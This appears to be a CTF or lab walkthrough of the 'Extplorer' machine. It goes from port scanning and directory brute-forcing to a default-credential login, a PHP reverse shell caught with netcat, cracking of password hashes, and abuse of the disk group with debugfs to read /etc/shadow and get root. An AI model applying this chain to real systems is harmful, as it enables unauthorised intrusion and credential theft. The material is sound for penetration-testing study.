##### Tags: `disk`  `filemanager`  `unusual file`  `debugfs`

# 🐧Extplorer🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.237.16
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 20:39 AEDT
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is running a wordpress  
use feroxbuster and found the filemanager
```
$ feroxbuster -u http://192.168.237.16 -w /usr/share/wordlists/dirb/common.txt -x php,txt,xml,zip
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.237.16/
 🚩  In-Scope Url          │ 192.168.237.16
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, xml, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      322c http://192.168.237.16/filemanager => http://192.168.237.16/filemanager/
```
logged in with default credential admin admin  
we can upload php reverse shell on filemanager
```
http://192.168.237.16/wp-content/plugins/php-reverse-shell.php
```
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.237.16] 59620
Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
www-data@dora:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
we found there is a unusual file call .htusers.php in filemanager  
and it has the pass hash of user dora
```
www-data@dora:/var/www/html/filemanager/config$ ls -la
ls -la
total 36
drwxr-xr-x  2 www-data www-data 4096 Apr  6  2023 .
drwxr-xr-x 11 www-data www-data 4096 Apr  6  2023 ..
-rw-r--r--  1 www-data www-data   15 Feb 23  2016 .htaccess
-rw-r--r--  1 www-data www-data  413 Apr  6  2023 .htusers.php
-rw-rw-r--  1 www-data www-data   99 Apr  6  2023 bookmarks_extplorer_admin.php
-rw-r--r--  1 www-data www-data 3007 Jan  6  2022 conf.php
-rw-r--r--  1 www-data www-data   44 Feb 23  2016 index.html
-rw-r--r--  1 www-data www-data 7871 Jan  6  2022 mimes.php
www-data@dora:/var/www/html/filemanager/config$ cat .htusers.php
<?php 
        // ensure this file is being included by a parent file
        if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
        $GLOBALS["users"]=array(
        array('admin','21232f297a57a5a743894a0e4a801fc3','/var/www/html','http://localhost','1','','7',1),
        array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),
); 
```
use john the ripper to crack the hash
the password is doraemon
```
$ john --wordlist=/home/ming/Downloads/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
doraemon         (?)     
```
switch user to dora
```
www-data@dora:/var/www/html/filemanager/config$ su dora
Password: doraemon

dora@dora:/var/www/html/filemanager/config$ id
id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```
## Privilege Escalation  

User dora is a group member of disk  
In Linux, the disk group allows raw read/write access to sensitive data even you don't have permission  
https://www.hackingarticles.in/disk-group-privilege-escalation/  
First, check the disk space summary
```
dora@dora:/var/www/html/filemanager/config$ df -h  
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/1000
```
root should mount on the largest disk which is /dev/mapper/ubuntu--vg-ubuntu--lv  

use debugfs function and make test directory to check the sensitive file like /etc/shadow
```
$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs 1.45.5 (07-Jan-2020)

debugfs:  mkdir test
mkdir: Filesystem opened read/only

debugfs:  cat /etc/shadow
cat /etc/shadow
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
```
we got the hash of root  
crack it offline with john the ripper 
```
$ john --wordlist=/home/ming/Downloads/rockyou.txt hash.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
explorer         (root)     
```
switch to root using the password explorer  
and we got it
```
dora@dora: su root
Password: explorer

root@dora:/# id
uid=0(root) gid=0(root) groups=0(root)
```
